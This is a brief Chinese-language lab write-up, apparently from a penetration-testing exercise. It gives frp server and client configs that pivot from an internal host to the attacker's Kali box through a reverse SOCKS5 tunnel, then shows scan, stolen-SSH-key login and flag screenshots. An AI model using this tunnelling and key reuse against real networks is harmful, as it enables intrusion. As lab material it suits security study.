## 因為是內網，所以用 frp 架 socket
- kali
  - frps.ini 的內容
    ```
    [common]
    bind_port = 7000
    ```
  - 執行
    ```
    ./frps -c frps.ini
    ```
- .121
  - frpc.ini 的內容
    ```
    [common]
    server_addr = 192.168.45.215  (自己的 ip)
    server_port = 7000
    [socks5]
    type = tcp
    plugin = socks5
    remote_port = 5555
    ```
  - 執行
    ```
    frpc.exe -c frpc.ini
    ```
- 架好 socket 用 sudo proxychains 接工具指令

## nmap scanning
- <img width="1462" height="712" alt="image" src="https://github.com/user-attachments/assets/7bdf3bc6-cbc6-4e9b-9c25-e7967f2f1c8c" />

## 22 port
- 在 .122 發現 mario 的 id_rsa
  - <img width="1918" height="792" alt="image" src="https://github.com/user-attachments/assets/54d7fcbd-0a59-4fc6-8f45-7f85f094bc8f" />
- 成功登入
  - <img width="1377" height="615" alt="image" src="https://github.com/user-attachments/assets/5b533a2e-f511-403f-91bd-ab1dfc487a59" />
- 取得 local.txt
  - <img width="660" height="57" alt="image" src="https://github.com/user-attachments/assets/62cd48bb-32d9-4416-b35b-30aacbdf9d89" />





















